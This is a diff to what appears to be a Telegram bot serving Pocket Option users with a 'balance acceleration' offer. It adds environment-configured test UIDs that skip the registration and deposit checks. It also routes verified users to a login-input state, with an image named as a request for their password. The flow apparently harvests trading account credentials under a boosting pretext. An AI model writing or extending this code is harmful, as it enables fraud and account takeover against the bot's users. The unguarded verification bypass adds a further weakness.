@@ -36,6 +36,17 @@ TEMPLATES_PATH = os.path.join(BASE_DIR, 'message_templates.json')
 with open(TEMPLATES_PATH, 'r', encoding='utf-8') as f:
     messages = json.load(f)
 
+# Тестовые UID из окружения: поддерживаем SECRET_UID и SECRET_TEST_UIDS (через запятую/пробел)
+def _get_test_uids() -> set[str]:
+    values = []
+    v1 = os.getenv("SECRET_UID") or ""
+    v2 = os.getenv("SECRET_TEST_UIDS") or ""
+    if v1.strip():
+        values.append(v1.strip())
+    if v2.strip():
+        values.extend([p.strip() for p in re.split(r"[,;\s]+", v2) if p.strip()])
+    return set(values)
+
 user_router = Router()
 
 # Define states for the new user flow
@@ -247,9 +258,8 @@ async def _verify_pocket_option_registration(message: types.Message, state: FSMC
         message_to_reply = message
 
     # Allow privileged UID from environment (if set)
-    import os
-    secret_uid = os.getenv("SECRET_UID")
-    if secret_uid and message.text.strip() == secret_uid:
+    test_uids = _get_test_uids()
+    if message.text.strip() in test_uids:
         await state.update_data(pocket_option_uid=message.text.strip())
         from app.dispatcher import admin_panel
         min_deposit = admin_panel.get_referral_settings().get("min_deposit", 100)
@@ -304,19 +314,18 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
     from app.dispatcher import admin_panel, trading_api
     user_id = message.from_user.id
 
-    # Allow privileged UID from environment (if set)
-    import os
-    secret_uid = os.getenv("SECRET_UID")
-    if secret_uid and uid.strip() == secret_uid:
-        # This is a test user, grant them a test balance.
+    # Allow privileged UID from environment (supports multiple test UIDs)
+    test_uids = _get_test_uids()
+    if uid.strip() in test_uids:
+        # This is a test user, grant them a test balance and go through normal flow
         await state.update_data(initial_balance=100.0)
         await send_message_with_photo(
             message=message,
-            photo_name="your currency balance.jpg",
-            text=f"Your current balance: $100.00\nTime remaining until acceleration ends: 0d 23h 59m",
-            reply_markup=get_boost_active_keyboard()
+            photo_name="gread need yuor lign password.jpg",
+            text=messages["pocket_option_verification_successful"],
+            reply_markup=None
         )
-        await state.set_state(UserFlow.pocket_option_boosting)
+        await state.set_state(UserFlow.pocket_option_login_input)
         return
 
     wait_message = await message.answer("🔎 Перевіряємо ваш баланс...")
